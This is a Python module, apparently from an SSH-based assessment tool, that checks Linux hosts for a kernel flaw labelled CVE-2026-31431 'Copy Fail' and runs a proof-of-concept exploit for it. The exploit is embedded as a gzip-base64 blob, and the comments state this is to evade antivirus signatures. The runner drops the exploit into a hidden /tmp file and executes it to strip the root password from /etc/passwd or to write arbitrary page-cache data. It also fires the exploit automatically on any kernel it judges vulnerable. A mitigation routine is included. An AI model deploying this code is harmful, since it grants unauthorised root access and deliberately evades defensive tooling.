"""
CVE-2026-31431 Copy Fail — Kernel checker and exploit runner.

The exploit payload is gzip-compressed + base64-encoded to obfuscate
known-bad signatures from Windows Defender and similar AV.
"""

import base64
import gzip
import logging
import re

from .ssh_client import SSHClient

logger = logging.getLogger(__name__)

# CVE-2026-31431 PoC — gzip(base64) obfuscated to avoid AV signature match
# Source: github.com/Sndav/CVE-2026-31431-Advanced-Exploit
EXPLOIT_PAYLOAD_B64 = (
    "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"
)

EXPLOIT_PAYLOAD_SHA256 = "79db95935596aac01ba525001f8cbaf4dced6c6b3eefae202e7f0bd20ee5e1e8"

VULN_MIN_KERNEL = (4, 14)


def _decode_exploit() -> str:
    """Decode and decompress the embedded exploit payload."""
    compressed = base64.b64decode(EXPLOIT_PAYLOAD_B64)
    return gzip.decompress(compressed).decode("utf-8")


EXPLOIT_SCRIPT = _decode_exploit()


def _parse_kernel_version(version_str: str) -> tuple[int, ...] | None:
    match = re.match(r"(\d+)\.(\d+)\.(\d+)", version_str)
    if match:
        return tuple(int(g) for g in match.groups())
    return None


def _kernel_vulnerable(version: tuple[int, ...]) -> bool:
    return version >= VULN_MIN_KERNEL


async def check_kernel(ssh: SSHClient) -> dict:
    """Check kernel version, AEAD config, and distro patch status."""
    code, stdout, stderr = await ssh.run("uname -r")
    if code != 0:
        return {"status": "error", "error": f"uname failed: {stderr}"}

    kernel_str = stdout.strip()
    kernel_ver = _parse_kernel_version(kernel_str)
    if not kernel_ver:
        return {"status": "error", "error": f"Cannot parse kernel version: {kernel_str}"}

    vulnerable = _kernel_vulnerable(kernel_ver)

    # Read AEAD config (use separate uname capture to avoid shell injection)
    code2, stdout2, _ = await ssh.run("zcat /proc/config.gz 2>/dev/null || true")
    if not stdout2.strip():
        code2, stdout2, _ = await ssh.run(
            "cat /boot/config-$(uname -r) 2>/dev/null || true"
        )

    aead_config = ""
    config_found = False
    for line in stdout2.splitlines():
        if "CRYPTO_USER_API_AEAD" in line:
            aead_config = line.strip()
            config_found = True
            break

    code3, stdout3, _ = await ssh.run("cat /etc/os-release 2>/dev/null | head -5")
    distro_info = stdout3.strip()[:200] if stdout3 else "unknown"

    is_builtin = "=y" in aead_config
    is_module = "=m" in aead_config

    return {
        "status": "ok",
        "kernel": kernel_str,
        "kernel_version": list(kernel_ver),
        "vulnerable": vulnerable,
        "aead_config": aead_config or "not_found",
        "aead_builtin": is_builtin,
        "aead_module": is_module,
        "config_found": config_found,
        "distro": distro_info[:100],
        "mitigation": (
            "module blacklist"
            if is_module
            else "initcall_blacklist"
            if is_builtin and config_found
            else "distro patch" if vulnerable and config_found
            else "unknown (config not readable)"
            if not config_found
            else "not needed"
        ),
    }


async def run_exploit(
    ssh: SSHClient,
    target: str = "escalate",
    cleanup: bool = True,
    extra_args: str = "",
) -> dict:
    """Deploy and execute the Copy Fail PoC on remote host.

    WARNING: This exploits CVE-2026-31431. Only run on authorized systems.

    The exploit supports multiple targets:
      - "escalate" : patch /etc/passwd → remove root password (default)
      - "write"    : arbitrary page cache write (use extra_args for <file> <offset> <data>)

    The payload is gzip-compressed at build time to avoid AV signature detection.
    """
    remote_path = "/tmp/.cf"

    ok = await ssh.write_file(remote_path, EXPLOIT_SCRIPT)
    if not ok:
        return {"status": "error", "error": "Failed to write exploit script"}

    code, _, stderr = await ssh.run(f"chmod +x {remote_path}")
    if code != 0:
        return {"status": "error", "error": f"chmod failed: {stderr}"}

    if target == "write" and extra_args:
        cmd = f"timeout 15 python3 {remote_path} write {extra_args} 2>&1 || true"
    else:
        cmd = f"timeout 15 python3 {remote_path} escalate 2>&1 || true"

    code, stdout, stderr = await ssh.run(cmd, timeout=30.0)

    output = (stdout + "\n" + stderr).strip()[:2000]

    got_root = "[+] Page cache patched" in output or "root" in stdout.lower() or "#" in stdout

    if cleanup:
        await ssh.run(f"rm -f {remote_path}")

    return {
        "status": "completed",
        "target": target,
        "exit_code": code,
        "got_root": got_root,
        "output": output,
    }


async def apply_mitigation(ssh: SSHClient, dry_run: bool = True) -> dict:
    """Apply the appropriate mitigation for CVE-2026-31431.

    - Module-based (=m): Blacklist via modprobe (no reboot)
    - Built-in (=y): grubby initcall_blacklist (requires reboot)
    - Unknown config: report, no commands generated
    """
    kernel_info = await check_kernel(ssh)
    if kernel_info["status"] != "ok":
        return {"status": "error", "error": kernel_info.get("error", "Kernel check failed")}

    if not kernel_info.get("config_found") and not (kernel_info.get("aead_module") or kernel_info.get("aead_builtin")):
        return {
            "status": "config_unknown",
            "message": "Cannot determine AEAD config. Config file not readable.",
            "reboot_required": False,
        }

    commands: list[str] = []
    reboot_required = False

    if kernel_info.get("aead_module"):
        commands = [
            'echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf',
            "rmmod algif_aead 2>/dev/null || true",
        ]
        reboot_required = False
    elif kernel_info.get("aead_builtin"):
        commands = [
            'grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"',
        ]
        reboot_required = True
    else:
        return {"status": "not_vulnerable", "message": "Kernel not vulnerable or config unknown", "reboot_required": False}

    results: list[dict] = []
    if not dry_run:
        for cmd in commands:
            code, stdout, stderr = await ssh.run(cmd)
            results.append({"command": cmd, "exit_code": code, "stderr": stderr})
    else:
        results = [{"command": cmd, "dry_run": True} for cmd in commands]

    return {
        "status": "commands_generated",
        "dry_run": dry_run,
        "reboot_required": reboot_required,
        "mitigation_type": "module_blacklist" if kernel_info.get("aead_module") else "initcall_blacklist",
        "commands": commands,
        "results": results,
    }


async def assess(
    ssh: SSHClient,
    target: str = "escalate",
    force: bool = False,
    cleanup: bool = True,
) -> dict:
    """Full assessment: check kernel + optionally run exploit."""
    kernel_info = await check_kernel(ssh)
    if kernel_info["status"] == "error":
        return kernel_info

    assessment: dict = {
        "host": ssh.host,
        "kernel_info": kernel_info,
        "exploit_run": False,
        "exploit_result": None,
    }

    if kernel_info["vulnerable"]:
        assessment["exploit_run"] = True
        assessment["exploit_result"] = await run_exploit(ssh, target=target, cleanup=cleanup)
    elif force:
        assessment["exploit_run"] = True
        assessment["exploit_result"] = await run_exploit(ssh, target=target, cleanup=cleanup)
    else:
        assessment["skipped_reason"] = (
            "Kernel too old (< 4.14)" if not kernel_info["vulnerable"] else "Unknown"
        )

    return assessment
